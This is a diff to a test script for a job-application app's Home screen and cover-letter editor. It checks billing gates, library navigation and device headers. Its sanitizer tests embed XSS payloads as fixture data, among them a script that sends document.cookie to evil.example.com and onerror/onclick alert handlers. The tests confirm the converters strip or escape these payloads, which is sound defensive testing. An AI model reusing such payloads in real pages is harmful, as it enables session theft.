@@ -98,6 +98,8 @@ const FILES = {
   'onboarding/index.tsx': R('../app/(onboarding)/index.tsx'),
   'EmployerChip.tsx': chipSrc, 'useHomeBuilds.ts': kHookSrc, 'useTargetDoc.ts': docHookSrc,
   'employerDocs.ts': docSvcSrc, 'homeBuilds.ts': buildsSrc, 'BuildingOverlay.tsx': overlaySrc,
+  // The letter editor a letter page's Customize opens (2026-09-13).
+  '(cover-letter)/edit.tsx': R('../app/(cover-letter)/edit.tsx'),
 };
 
 console.log('── every file parses (a JSX slip here white-screens the app) ──');
@@ -502,9 +504,14 @@ ok('…and the drawn page knows a letter from a resume', /LETTER_RULES/.test(his
 
 ok('the section paints from cache BEFORE the network', /cachedDownloadHistory/.test(homeC));
 ok('…and a failed refresh leaves what is on screen alone', /if \(fresh\) setHistory/.test(homeC));
-ok('re-download goes through the server, which re-runs the same gate', /redownload\(it\.id\)/.test(homeC));
-ok('⚠️ a locked row opens the SAME purchase sheet a first download offers',
-  /r\.locked/.test(homeC) && /<DownloadPaywallSheet/.test(homeC));
+// ⚠️ RETARGETED (2026-09-13): a library TAP no longer downloads — it opens the page (openHistoryItem, pinned
+// in the LIBRARY CARD OPENS ITS PAGE section). These two now cover only the one fallback that still gets the
+// file: a cover letter with no saved letter behind it, where there is no page to preview.
+ok('the no-saved-letter fallback re-downloads through the server, which re-runs the same gate',
+  /redownload\(it\.id\)/.test(homeC) && /if \(item\.unlocked\) doAgain\(item\);/.test(fnBodyOf(homeC, 'openHistoryItem')));
+ok('⚠️ …and a locked row there opens the SAME purchase sheet a first download offers',
+  /r\.locked/.test(homeC) && /<DownloadPaywallSheet/.test(homeC)
+  && /else \{ againItem\.current = null; setPayFor\(item\.employer \|\| null\); \}/.test(fnBodyOf(homeC, 'openHistoryItem')));
 ok('the resume asymmetry is stated rather than hidden', /latest resume in that design/.test(histSrc));
 // ⚠️ THIS ONE COST A BLANK SECTION ON THE APP'S FRONT DOOR, CAUGHT IN THE PREVIEW HARNESS.
 // The rows used to be swapped inside the completion callback of a fade-OUT. Flipping the mode also
@@ -925,9 +932,11 @@ ok('⚠️ admins skip the watching cap — and ONLY that cap',
   /maxWatching: admin \? Infinity : TRACK_MAX_WATCHING, maxInsertsPerDay: TRACK_MAX_INSERTS_PER_DAY/.test(aiHubC));
 
 console.log('── ⚠️ A BUILD STARTS ON ITS OWN ONLY WHEN SOMETHING THAT IS NOT CREDITS PAYS ──');
-// The user's standing rule (the letters auto-regen incident): never charge silently. After the free build
-// (1 per 30 days) or the plan quota is used, canConsumeMany falls through to LEGACY CREDITS (2) and
-// consumeOnSuccess takes them with no prompt. So Home asks a dry-run gate first.
+// The user's standing rule (the letters auto-regen incident): never charge silently. Home asks a dry-run gate
+// first. ⚠️ Since 2026-09-13 the server has no credits lane for a resume or a letter at all (canConsumeMany
+// answers quota_exhausted — pinned in server/scripts/test-free-plan-entitlements.js); these client checks stay
+// as the second fence, so an older or misconfigured server that still says 'credits' is asked about, never
+// auto-built.
 ok('there is a dry-run gate the build is checked against', /router\.post\('\/generation-gate'/.test(routes));
 ok('⚠️ the gate knows the per-employer cache, so a resume already paid for is never paywalled',
   /via: 'cache'|via:'cache'/.test(ctl));
@@ -935,13 +944,26 @@ ok('⚠️ the gate knows the per-employer cache, so a resume already paid for i
 // unit can go in between. coveredOnly makes the SERVER refuse the credits lane rather than fall into it.
 ok('⚠️ an auto-started build cannot fall through to credits', /const coveredOnly = !!\(req\.body && req\.body\.coveredOnly === true\)/.test(ctl));
 ok('…re-asked at the moment of payment, because the AI minute sits in between', /lost its cover during the run/.test(ctl));
-// ⚠️ RETARGETED to useHomeBuilds, where the gate is read now. coveredOnly:false is sent from exactly two
-// places: the Build button of a dialog that named the charge, and a queued build whose consent covers the
-// price the re-read gate asks (consentCovers).
-ok('⚠️ credits are spent only after an explicit confirm',
-  /text: 'Build',[\s\S]{0,200}runBuild\(latest\(\), 'credits', false,/.test(kHookC)
-  && (kHookC.match(/runBuild\((?:[^()]|\([^()]*\))*?, false,/g) || []).length === 3
-  && /if \(consentCovers\(q\.consent, gate\)\) \{[\s\S]{0,200}runBuild\(job, [^)]*, false,/.test(kHookC));
+// ⚠️ RETARGETED 2026-09-14. There is no credits lane for a resume or a letter any more, so nothing on Home may
+// consent to a credit charge: a gate that still says 'credits' gets the plan-words dialog and its Build goes out
+// coveredOnly:TRUE (plan, free allowance, pass or cache — or a refusal into the plans state). coveredOnly:false is
+// sent from exactly two places, both for the UNREAD gate: that dialog's Build, and a queued build carrying that
+// same "go ahead without a gate answer" (consentCovers), which never covers a credits answer.
+{
+  const falses = kHookC.match(/runBuild\((?:[^()]|\([^()]*\))*?, false,/g) || [];
+  ok('⚠️ a credits answer is never consented to — its Build is covered-only; only an unread gate\'s Build sends false',
+    /text: 'Build',[\s\S]{0,400}if \(credits\) runBuild\(latest\(\), 'credits', true,/.test(kHookC)
+    && /else runBuild\(latest\(\), 'unknown', false,/.test(kHookC)
+    && falses.length === 2 && falses.every((c) => /'unknown', false,$/.test(c))
+    && !/runBuild\([^;]*'credits', false/.test(kHookC)
+    && /if \(consentCovers\(q\.consent, gate\)\) \{[\s\S]{0,200}runBuild\(job, 'unknown', false,/.test(kHookC)
+    && /if \(gate\.via === 'credits'\) return false;/.test(fnBodyOf(kHookC, 'consentCovers')), falses);
+  // ⚠️ AND NO USER SEES THE WORD. Every string literal the hook can show (Alert titles, messages, buttons, notices,
+  // GATE_COPY) is checked; the bare 'credits' tag is a gate value compared in code, never shown.
+  const lits = [...kHookC.matchAll(/'(?:[^'\\\n]|\\.)*'|"(?:[^"\\\n]|\\.)*"|`(?:[^`\\]|\\.)*`/g)].map((m) => m[0]);
+  const worded = lits.filter((l) => /credit/i.test(l) && l !== "'credits'");
+  ok('⚠️ no credits wording in anything useHomeBuilds can show (the \'credits\' gate value only)', lits.length > 30 && worded.length === 0, worded);
+}
 ok('⚠️ an unknown gate answer asks first, never auto-builds',
   /gate\.reason === 'unknown'/.test(kHookC) && /runBuild\(latest\(\), 'unknown', false,/.test(kHookC)
   && /if \(gate\.covered\) \{ runBuild\(final, gate\.via, true,/.test(kHookC));
@@ -1363,5 +1385,388 @@ console.log('── ⚠️ THE CHIP LOOKUP CARRIES THE POSTING, AND THE SERVER A
     && /const noResumeYet = [^;]*hasResume \?\? !sample/.test(homeC));
 }
 
-console.log(`\nemployer home: ${pass} passed, ${fail} failed`);
-process.exit(fail ? 1 : 0);
+console.log('── ⚠️ A LETTER PAGE HAS THE SAME TWO ACTIONS AS A RESUME PAGE (2026-09-13) ──');
+{
+  // The zoomed letter used to offer one "Download" — the only door to a letter, and no way to edit its words.
+  ok('PaperZoom has no Download button any more', !/>\s*Download\s*</.test(zoomC) && !/onDownload/.test(zoomC));
+  ok('…Customize (ghost) and View PDF (primary) are rendered ONCE, for a resume and a letter alike',
+    (zoomC.match(/>Customize</g) || []).length === 1 && (zoomC.match(/>View PDF</g) || []).length === 1
+    && /style=\{s\.ghost\}[\s\S]{0,160}setTimeout\(onCustomize, 200\)[\s\S]{0,200}>Customize</.test(zoomC)
+    && /style=\{s\.primaryWrap\}[\s\S]{0,160}setTimeout\(onViewPdf, 200\)[\s\S]{0,400}>View PDF</.test(zoomC));
+  ok('…the button branch is sample-or-not, never letter-or-resume',
+    /\{sample \? \(/.test(zoomC) && !/\{letter \? \(/.test(zoomC) && !/letter && \(/.test(zoomC));
+  ok('…and a letter is never a sample (a sample card keeps its single "Build my resume")',
+    /const sample = !!sampleProp && !letter;/.test(zoomC) && (zoomC.match(/>Build my resume</g) || []).length === 1);
+  ok('the hero letter zoom: Customize → the letter EDITOR, View PDF → the letter picker',
+    /if \(kind === 'cover_letter'\) \{ openLetterEditor\(\); return; \}/.test(homeC)
+    && /if \(kind === 'cover_letter'\) \{ openLetterPicker\(id\); return; \}/.test(homeC));
+  const edBody = fnBodyOf(homeC, 'openLetterEditor');
+  ok('⚠️ openLetterEditor pushes /(cover-letter)/edit with the saved letter\'s docId — and nothing else',
+    /nav\(\)\?\.push\?\.\(\{ pathname: '\/\(cover-letter\)\/edit', params: \{ docId: String\(d\.docId\) \} \}\)/.test(edBody)
+    && /d\.kind !== 'cover_letter'/.test(edBody)
+    && !/AsyncStorage|autoBuild|generate|checkBuildGate|buildFor\(/.test(edBody), edBody.slice(0, 300));
+  ok('⚠️ …and while the letter is still on its way it says so instead of doing nothing',
+    /if \(docOnItsWay\(\)\) sayLoadingDoc\(\);/.test(edBody));
+}
+
+console.log('── ⚠️ A LIBRARY CARD OPENS ITS PAGE — IT NEVER DOWNLOADS ON THE TAP (2026-09-13) ──');
+{
+  const tapBody = fnBodyOf(histC, 'tap');
+  ok('the row\'s press is the open handler', /onPress=\{tap\}/.test(histC));
+  ok('⚠️ tap calls onOpen with the PAPER\'s measured rectangle, or null when it cannot measure',
+    /node\.measureInWindow\(\(x: number, y: number, w: number, h: number\) => onOpen\(item, w \? \{ x, y, w, h \} : null\)\)/.test(tapBody)
+    && /typeof node\.measureInWindow !== 'function'\) \{ onOpen\(item, null\); return; \}/.test(tapBody)
+    && /const node: any = paper\.current;/.test(tapBody), tapBody.slice(0, 300));
+  ok('…measured on a view Android will not flatten away', /<View ref=\{paper\} collapsable=\{false\}/.test(histC));
+  ok('⚠️ NOTHING in DownloadHistory calls onAgain, onPay or redownload any more',
+    !/onAgain\s*\(|onPay\s*\(|onAgain\?\.\(|onPay\?\.\(|redownload/.test(histC));
+  ok('…the old props survive only as optional, for any other caller',
+    /onAgain\?: \(it: DownloadHistoryItem\) => void;/.test(histC) && /onPay\?: \(employer: string \| null\) => void;/.test(histC)
+    && /onOpen: \(item: DownloadHistoryItem, origin: OriginRect \| null\) => void;/.test(histC));
+  ok('Home wires the library to openHistoryItem, and passes it no download handler',
+    /<DownloadHistory\n[\s\S]{0,400}onOpen=\{openHistoryItem\}/.test(homeC)
+    && !/<DownloadHistory\n[^/]*?(onAgain|onPay)=/.test(homeC));
+
+  const oh = fnBodyOf(homeC, 'openHistoryItem');
+  ok('openHistoryItem: the kind comes from the row', /const k: DocKind = item\.kind === 'cover_letter' \? 'cover_letter' : 'resume';/.test(oh));
+  ok('…the saved list in hand for that kind, else ONE read of it',
+    /k === kindRef\.current \? docListRef\.current : null/.test(oh) && /docLoadersRef\.current\?\.list \|\| fetchDocList/.test(oh)
+    && /list = await read\(k\)/.test(oh));
+  ok('⚠️ …a list that could not be read is NOT "nothing saved": a notice, and nothing opens',
+    /if \(!list\) \{\s*showNotice\([\s\S]{0,160}\);\s*return;\s*\}/.test(oh));
+  ok('…a doc, matched by sameEmployerName via savedDocFor', /const saved = who \? savedDocFor\(list, who\) : null;/.test(oh));
+  ok('⚠️ no doc + letter → the old file fallback with a notice (nothing to preview), never a zoom',
+    /if \(k === 'cover_letter'\) \{[\s\S]{0,700}showNotice\([\s\S]{0,300}if \(item\.unlocked\) doAgain\(item\);[\s\S]{0,120}return;\s*\}/.test(oh));
+  ok('no doc + resume → the zoom on the BASE page in that design (thumbFor), doc null',
+    /setZoom\(\{\s*src: 'library', n, rect: origin, kind: k, doc: null,[\s\S]{0,200}image: thumbFor\(item\.templateId\) \|\| null/.test(oh));
+  ok('with a doc → the zoom opens AT ONCE for { id: templateId, name: templateName, image, fit } with that doc',
+    /setZoom\(\{\s*src: 'library', n, rect: origin, kind: k, doc: zd,[\s\S]{0,200}id: item\.templateId, name: item\.templateName, accent, image, fit/.test(oh)
+    && /const zd: ZoomDoc = \{ docId: saved\.docId, kind: k, employer: saved\.employer \|\| who \};/.test(oh));
+  ok('…then fills the image from fetchDocCards(kind, docId, [templateId]) — never with an empty id list',
+    /if \(!image && item\.templateId\) fillDocPage\(n, k, saved, item\.templateId\);/.test(oh)
+    && /await readCards\(k, saved\.docId, \[templateId\]\)/.test(fnBodyOf(homeC, 'fillDocPage'))
+    && /docLoadersRef\.current\?\.cards \|\| fetchDocCards/.test(fnBodyOf(homeC, 'fillDocPage')));
+  ok('⚠️ …and a page that lands after the sheet closed (or another card opened) is dropped',
+    /if \(libOpen\.current !== n \|\| !alive\.current\) return;/.test(fnBodyOf(homeC, 'fillDocPage'))
+    && /z && z\.src === 'library' && z\.n === n/.test(fnBodyOf(homeC, 'fillDocPage')));
+  ok('⚠️ openHistoryItem itself never downloads, bills or generates a saved document',
+    !/redownload|checkBuildGate|buildFor\(|autoBuild|coverLetterPickerContext/.test(oh));
+
+  // Customize / View PDF from a LIBRARY zoom go through the hero's own doors.
+  ok('library Customize: letter → openLetterEditor(that doc); resume → customizeResume(that doc, its employer)',
+    /if \(libZoom\.kind === 'cover_letter'\) openLetterEditor\(libZoom\.doc\);\s*else customizeResume\(libZoom\.doc, \{ company: libZoom\.employer, role: '' \}, libZoom\.sample\);/.test(homeC));
+  ok('library View PDF: letter → openLetterPicker(design, that doc); resume → openResumeGallery(design, that doc, its employer)',
+    /if \(libZoom\.kind === 'cover_letter'\) \{ openLetterPicker\(id, libZoom\.doc\); return; \}/.test(homeC)
+    && /openResumeGallery\(id, libZoom\.doc, \{ company: libZoom\.employer, role: '' \}\);/.test(homeC));
+  const cz = fnBodyOf(homeC, 'customizeResume');
+  ok('customizeResume: a saved doc → /(resume-builder)/preview { docId }; none → /(resume-builder)/preview',
+    /pathname: '\/\(resume-builder\)\/preview', params: \{ docId: String\(d\.docId\) \}/.test(cz)
+    && /nav\(\)\?\.push\?\.\('\/\(resume-builder\)\/preview'\)/.test(cz) && /if \(sample\) armBuilderFor\(target\)/.test(cz));
+  const gz = fnBodyOf(homeC, 'openResumeGallery');
+  ok('openResumeGallery: /(resume-builder)/templates { template, employer, docId }',
+    /pathname: '\/\(resume-builder\)\/templates'/.test(gz) && /\.\.\.\(id \? \{ template: id \} : \{\}\)/.test(gz)
+    && /\.\.\.\(target\?\.company \? \{ employer: target\.company \} : \{\}\)/.test(gz)
+    && /\.\.\.\(d \? \{ docId: String\(d\.docId\)/.test(gz));
+  const lp = fnBodyOf(homeC, 'openLetterPicker');
+  ok('openLetterPicker takes the library\'s doc, stores the picker context with its docId, and opens the gallery on the design',
+    /const d: ZoomDoc \| null = forDoc !== undefined \? forDoc : docRef\.current;/.test(lp)
+    && /AsyncStorage\.setItem\('coverLetterPickerContext'/.test(lp) && /docId: full\.docId/.test(lp)
+    && /pathname: '\/\(cover-letter\)\/templates',\s*params: \{ \.\.\.\(templateId \? \{ template: templateId \} : \{\}\), docId: String\(full\.docId\) \}/.test(lp));
+
+  // savedDocFor, run for real: same employer by name, the employer-level document (jobUrl '') first, else newest.
+  const fnSrc = (home.match(/function savedDocFor\([\s\S]*?\n\}/) || [''])[0];
+  const docsJs = ts.transpileModule(docSvcSrc, { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2019 } }).outputText;
+  let sameEmployerName = null;
+  try {
+    const m = { exports: {} };
+    // './employerHomeService' now also supplies deviceHeaders to call(); savedDocFor/sameEmployerName never reach it.
+    const fakeReq = (id) => (/async-storage/.test(id) ? { default: { getItem: async () => null, setItem: async () => {}, removeItem: async () => {} } }
+      : /employerHomeService/.test(id) ? { deviceHeaders: async () => ({}) } : {});
+    new Function('module', 'exports', 'require', docsJs)(m, m.exports, fakeReq);
+    sameEmployerName = m.exports.sameEmployerName;
+  } catch (e) { console.log('     (employerDocs.ts did not load: ' + String(e.message).split('\n')[0] + ')'); }
+  let savedDocFor = null;
+  if (fnSrc && sameEmployerName) {
+    const js = ts.transpileModule(fnSrc, { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2019 } }).outputText;
+    savedDocFor = new Function('sameEmployerName', js + '\nreturn savedDocFor;')(sameEmployerName);
+  }
+  ok('savedDocFor + sameEmployerName load and run', typeof savedDocFor === 'function');
+  if (savedDocFor) {
+    const L = [
+      { docId: 1, employer: 'Airbus', jobUrl: 'https://ag.wd3.myworkdayjobs.com/x/job/1', updatedAt: '2026-09-12T10:00:00Z' },
+      { docId: 2, employer: 'AIRBUS', jobUrl: '', updatedAt: '2026-09-01T10:00:00Z' },
+      { docId: 3, employer: 'Airbus', jobUrl: 'https://ag.wd3.myworkdayjobs.com/x/job/2', updatedAt: '2026-09-13T10:00:00Z' },
+      { docId: 4, employer: 'Eneco', jobUrl: 'https://werkenbij.eneco.nl/v/1', updatedAt: '2026-09-02T10:00:00Z' },
+      { docId: 5, employer: 'Eneco', jobUrl: 'https://werkenbij.eneco.nl/v/2', updatedAt: '2026-09-10T10:00:00Z' },
+    ];
+    ok('⚠️ the employer-level document wins over a NEWER posting document', (savedDocFor(L, 'airbus') || {}).docId === 2);
+    ok('…with none, the newest posting document', (savedDocFor(L, 'Eneco') || {}).docId === 5);
+    ok('…another employer\'s documents are never picked', savedDocFor(L, 'Siemens') === null && savedDocFor([], 'Airbus') === null && savedDocFor(null, 'Airbus') === null);
+  }
+}
+
+console.log('── ⚠️ A USED-UP ALLOWANCE NAMES WHICH ONE, AND NEVER A CREDIT PRICE (2026-09-13) ──');
+{
+  const aoSrc = (overlaySrc.match(/function allowanceOf\([\s\S]*?\n\}/) || [''])[0];
+  let allowanceOf = null;
+  try {
+    const js = ts.transpileModule(aoSrc, { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2019 } }).outputText;
+    allowanceOf = new Function(js + '\nreturn allowanceOf;')();
+  } catch {}
+  ok('allowanceOf loads', typeof allowanceOf === 'function');
+  if (allowanceOf) {
+    // The server's own sentences (entitlements.canConsumeMany), word for word.
+    const FREE_R = "You've used your 3 free resume generations. Start a plan in Plans & Usage to keep going.";
+    const PLAN_L = "You've used all the cover letters in your plan this month. Upgrade in Plans & Usage to continue.";
+    const DEVICE = 'The free plan on this device was already used by another account. Start a plan in Plans & Usage to keep going.';
+    ok('the server\'s free sentence → free, even for a subscriber the app thinks is paid', allowanceOf('quota_exhausted', FREE_R, true) === 'free');
+    ok('the server\'s plan sentence → plan, even before isPaid is known', allowanceOf('quota_exhausted', PLAN_L, false) === 'plan');
+    ok('the device-blocked sentence → free', allowanceOf('quota_exhausted', DEVICE, false) === 'free');
+    ok('a sentence naming neither falls back to isPaid; regen_limit is always free',
+      allowanceOf('quota_exhausted', '', true) === 'plan' && allowanceOf('quota_exhausted', '', false) === 'free' && allowanceOf('regen_limit', PLAN_L, true) === 'free');
+  }
+  ok('the overlay\'s titles are the contract\'s, free and plan, resume and letter',
+    /title: "You've used your free cover letters"/.test(overlaySrc) && /title: "You've used your free resume generations"/.test(overlaySrc)
+    && /title: "You've used this month's cover letters"/.test(overlaySrc) && /title: "You've used this month's resume generations"/.test(overlaySrc));
+  ok('⚠️ the overlay\'s refusal copy never promises a refill or names credits',
+    !/credit/i.test(overlayC) && !/refills? (on|in|every)|every 30 days/i.test(overlayC));
+  ok('Home tells the overlay whether the user is on a plan', /isPaid=\{isPaid\}/.test(homeC));
+  ok('⚠️ Home\'s gate hint never says "Uses N credits"', !/credit/i.test(homeC) && !/Uses \$\{/.test(homeC));
+}
+
+console.log('── ⚠️ THE LETTER EDITOR: the user\'s words in, only p/br/strong out (2026-09-13) ──');
+{
+  const edSrc = R('../app/(cover-letter)/edit.tsx');
+  const edC = strip(edSrc);
+  const layoutSrc = R('../app/(cover-letter)/_layout.tsx');
+  ok('the route is registered in the (cover-letter) stack', /<Stack\.Screen name="edit" \/>/.test(layoutSrc));
+  const a = edSrc.indexOf('const DROP_WITH_CONTENT_RE'), b = edSrc.indexOf('/* ── THE SCREEN');
+  let toText = null, toHtml = null;
+  if (a > 0 && b > a) {
+    try {
+      const js = ts.transpileModule(edSrc.slice(a, b), { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2019 } }).outputText;
+      const m = { exports: {} };
+      new Function('module', 'exports', js)(m, m.exports);
+      toText = m.exports.letterHtmlToText; toHtml = m.exports.letterTextToHtml;
+    } catch (e) { console.log('     (edit.tsx converters did not load: ' + String(e.message).split('\n')[0] + ')'); }
+  }
+  ok('letterHtmlToText / letterTextToHtml load as pure functions', typeof toText === 'function' && typeof toHtml === 'function');
+  if (toText && toHtml) {
+    const stored = '<p>Dear Airbus team,</p>\n<p>I led <strong>Node.js</strong> and <b>PostgreSQL</b> work.<br>Across <em>payments</em> &amp; reliability.</p>'
+      + '<script>fetch("https://evil.example.com/?c="+document.cookie)</script><style>p{display:none}</style>'
+      + '<p onclick="alert(1)">Kind regards,<br/>Test Person</p><img src=x onerror=alert(1)><iframe src="http://127.0.0.1/admin">inner</iframe>';
+    const t = toText(stored);
+    ok('HTML → text: <p> = paragraphs, <br> = a line, <strong>/<b> = **bold**, other tags stripped, entities decoded',
+      t === 'Dear Airbus team,\n\nI led **Node.js** and **PostgreSQL** work.\nAcross payments & reliability.\n\nKind regards,\nTest Person', t);
+    ok('⚠️ …a <script>/<style>/<iframe> goes WITH its contents — not a word of it reaches the editor',
+      !/evil|cookie|fetch|display:none|inner|alert|onerror|onclick/.test(t), t);
+    ok('⚠️ …an unterminated <script> swallows the rest rather than leaking it', toText('<p>Hi</p><script>steal()') === 'Hi');
+    ok('…one decode pass: "&amp;lt;b&amp;gt;" is the TEXT "&lt;b&gt;", never markup', toText('<p>&amp;lt;b&amp;gt;</p>') === '&lt;b&gt;');
+
+    const typed = 'Dear team,\n\nI built **payment systems** & more.\nSecond line <script>alert(1)</script>\n\n\n<img src=x onerror=alert(1)> **x**';
+    const h = toHtml(typed);
+    ok('text → HTML: blank lines = <p>, a newline = <br>, **x** = <strong>x</strong>, everything else escaped',
+      h === '<p>Dear team,</p><p>I built <strong>payment systems</strong> &amp; more.<br>Second line &lt;script&gt;alert(1)&lt;/script&gt;</p>'
+        + '<p>&lt;img src=x onerror=alert(1)&gt; <strong>x</strong></p>', h);
+    const tags = [...h.matchAll(/<\/?([a-z0-9]+)/gi)].map((x) => x[1].toLowerCase());
+    ok('⚠️ …the ONLY tags that leave the editor are p, br and strong (the server keeps p/br/strong/b/em/i/ul/ol/li)',
+      tags.length > 0 && tags.every((x) => x === 'p' || x === 'br' || x === 'strong'), [...new Set(tags)]);
+    ok('…a lone ** stays literal, and an empty letter is no markup at all', toHtml('5 ** 2') === '<p>5 ** 2</p>' && toHtml('  \n\n ') === '');
+    const back = toText(toHtml(t));
+    ok('round trip: text → HTML → text is unchanged (bold and paragraphs kept)', back === t, back);
+
+    // ⚠️ BOLD NEVER MERGES ACROSS A BREAK (the reviewer's letter, 2026-09-14). The old merge joined "**", any \s
+    // gap (and \s includes \n), "**" — so two bold paragraphs became ONE bold run spanning a blank line, which
+    // letterTextToHtml (bold matched inside one paragraph) saved back as literal asterisks with the bold gone.
+    const REVIEWER = '<p><strong>Re: Application for Engineer</strong></p><p><strong>Dear Ms. Smith,</strong></p><p>Body</p>';
+    const rt = toText(REVIEWER);
+    ok('⚠️ two bold paragraphs stay two bold paragraphs', rt === '**Re: Application for Engineer**\n\n**Dear Ms. Smith,**\n\nBody', rt);
+    ok('⚠️ …and saving gives back the same HTML: bold kept, not one asterisk', toHtml(rt) === REVIEWER && !/\*/.test(toHtml(rt)), toHtml(rt));
+    ok('…stable on a second round trip', toText(toHtml(rt)) === rt);
+    const lineBr = toText('<p><strong>One</strong><br><strong>Two</strong></p>');
+    ok('⚠️ bold on both sides of a <br> is NOT merged, and round-trips', lineBr === '**One**\n**Two**' && toHtml(lineBr) === '<p><strong>One</strong><br><strong>Two</strong></p>', lineBr);
+    const everyLine = (x) => x.split('\n').every((l) => ((l.match(/\*\*/g) || []).length % 2) === 0);
+    const openAcross = toText('<p><strong>Open</p><p>still bold</strong> plain</p>');
+    ok('⚠️ a <strong> left open over </p> keeps the next paragraph bold, with markers balanced on EVERY line',
+      openAcross === '**Open**\n\n**still bold** plain' && everyLine(openAcross) && !/\*/.test(toHtml(openAcross)), openAcross);
+    ok('same-line runs still merge: <strong>Hello</strong> <strong>World</strong> (and &nbsp;) → one run',
+      toText('<p><strong>Hello</strong> <strong>World</strong></p>') === '**Hello World**'
+      && toText('<p><strong>Hello</strong>&nbsp;<strong>World</strong></p>') === '**Hello World**');
+    const listed = '<ul><li><strong>Led</strong> a team</li><li><strong>Built</strong> APIs</li></ul>';
+    const lt = toText(listed);
+    ok('bold list items: one "• " line each, balanced, never merged into each other', lt === '• **Led** a team\n• **Built** APIs' && everyLine(lt), lt);
+    ok('nested <b> inside <strong> is one bold run, not "****"', toText('<p><strong>a <b>b</b> c</strong></p>') === '**a b c**');
+  }
+  // ⚠️ RETARGETED 2026-09-14: goneOut no longer calls router.back() itself. It sets `exit`, and the back runs in the
+  // exit effect — a render later, once the usePreventRemove guard (dirty && !exit) is down, or the guard would
+  // swallow the very navigation that takes the user off a deleted letter.
+  const goneBody = fnBodyOf(edC, 'goneOut');
+  ok('it loads the letter by docId, and "gone" is an Alert and back (through the exit effect)',
+    /const d = await fetchDoc\(docId\)/.test(edC) && /if \(d === 'gone'\) \{ setLoading\(false\); goneOut\(\); return; \}/.test(edC)
+    && /Alert\.alert\('This letter is gone'/.test(goneBody) && /setExit\(\{\}\)/.test(goneBody) && !/router\.back\(\)/.test(goneBody)
+    && /if \(!exit\) return;\s*if \(exit\.action\) navigation\.dispatch\(exit\.action\);\s*else if \(router\.canGoBack\(\)\) router\.back\(\);/.test(edC), goneBody);
+  // ⚠️ THE iOS SWIPE. A beforeRemove listener cannot cancel a native dismiss, and gestureEnabled on this inner screen
+  // changed the wrong navigator (Home pushes the (cover-letter) GROUP). usePreventRemove reports up to the root stack.
+  ok('⚠️ unsaved edits are guarded by usePreventRemove (reaches the native swipe), with the guard dropped by STATE',
+    /import \{ usePreventRemove[^}]*\} from '@react-navigation\/native';/.test(edSrc)
+    && /usePreventRemove\(dirty && !exit, \(\{ data \}\) => \{/.test(edC)
+    && /text: 'Discard'[\s\S]{0,120}setExit\(\{ action: data\.action \}\)/.test(edC)
+    && !/addListener\('beforeRemove'/.test(edC) && !/gestureEnabled/.test(edC)
+    && /const \[exit, setExit\] = useState/.test(edC));
+  ok('⚠️ a resume docId is refused, so it can never be saved back as a letter', /if \(d\.kind !== 'cover_letter'\)/.test(edC));
+  ok('Save sends { ...payload, subject, coverLetterHtml } to saveDocPayload(docId, …)',
+    /const payload = \{ \.\.\.doc\.payload, subject: wantSubject, coverLetterHtml: html \};/.test(edC)
+    && /await saveDocPayload\(docId, payload\)/.test(edC) && /const html = letterTextToHtml\(wantBody\);/.test(edC));
+  ok('⚠️ any failure is "not saved", out loud — never a pretend success',
+    /\.catch\(\(\) => \(\{ ok: false as const, reason: 'network'/.test(edC) && /setSave\(\{ state: 'error', message \}\)/.test(edC)
+    && /Alert\.alert\('Not saved', r\.error\)/.test(edC) && /if \(r\.ok\) \{/.test(edC));
+  const og = fnBodyOf(edC, 'openGallery');
+  ok('View PDF writes coverLetterPickerContext { coverLetterHtml, companyName, companyAddress, employer, docId } and opens the gallery by docId',
+    /AsyncStorage\.setItem\('coverLetterPickerContext', JSON\.stringify\(\{\s*coverLetterHtml: html,\s*companyName: p\.companyName,\s*companyAddress: p\.companyAddress,\s*employer: doc\.employer,\s*docId,\s*\}\)\)/.test(og)
+    && /router\.push\(\{ pathname: '\/\(cover-letter\)\/templates', params: \{ docId: String\(docId\) \} \}/.test(og), og.slice(0, 400));
+  ok('⚠️ …with unsaved edits it saves FIRST (the gallery renders the server\'s copy)',
+    /if \(!dirty\) \{ openGallery\(base\.html\); return; \}\s*const r = await doSave\(\);/.test(edC));
+  ok('⚠️ the editor never generates or charges', !/generate|consumeOnSuccess|checkBuildGate|buildFor\(|autoBuild|\/cover-letter\/employer-build/.test(edC));
+  ok('Ionicons only, and expo-file-system (if ever) from /legacy', !/MaterialIcons|FontAwesome|Feather/.test(edSrc) && !/from 'expo-file-system'/.test(edSrc));
+}
+
+console.log('── ⚠️ THE DEVICE RIDES WITH EVERY HOME REQUEST, AND IS REPORTED FOR A LATER SIGN-IN (2026-09-14) ──');
+{
+  // The free 3 + 3 is ONE PER DEVICE, and the server can only hold that line for a device it can see. Home's
+  // gate and both build lanes sent Authorization only, and reportDeviceOnce ran once, 4 s after launch — so an
+  // account created later in that launch had no device at all: sign out, sign up, a second free allowance.
+  const transpileTs = (src) => ts.transpileModule(src, { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2020, esModuleInterop: true } }).outputText;
+  const load = (src, fakeReq) => { const m = { exports: {} }; new Function('module', 'exports', 'require', transpileTs(src))(m, m.exports, fakeReq); return m.exports; };
+  const asyncStore = { __esModule: true, default: { getItem: async () => null, setItem: async () => {}, removeItem: async () => {}, multiRemove: async () => {} } };
+  const secure = { getItemAsync: async (k) => (k === 'userSession' ? JSON.stringify({ token: 'TKN', id: 7 }) : null), setItemAsync: async () => {} };
+
+  // Source: every Authorization header these three services build carries the device beside it.
+  for (const [name, src] of [['employerHomeService.ts', svcC], ['homeAddEmployer.ts', addSvcC], ['employerDocs.ts', docSvcC]]) {
+    const auths = src.match(/\{ Authorization: `Bearer \$\{t\}`[^}]*\}/g) || [];
+    ok(`⚠️ ${name}: every Authorization header object also spreads deviceHeaders()`,
+      auths.length >= 1 && auths.every((h) => /\.\.\.\(await deviceHeaders\(\)\)/.test(h)), auths);
+  }
+  ok('homeAddEmployer and employerDocs take THE helper from employerHomeService (one id, one header name)',
+    /import \{[^}]*\bdeviceHeaders\b[^}]*\} from '\.\/employerHomeService';/.test(addSvcSrc)
+    && /import \{[^}]*\bdeviceHeaders\b[^}]*\} from '\.\/employerDocs'|import \{[^}]*\bdeviceHeaders\b[^}]*\} from '\.\/employerHomeService';/.test(docSvcSrc)
+    && /export async function deviceHeaders\(\)/.test(svcC) && /'x-device-id': deviceIdMemo/.test(svcC) && /from '\.\/deviceId'/.test(svc));
+
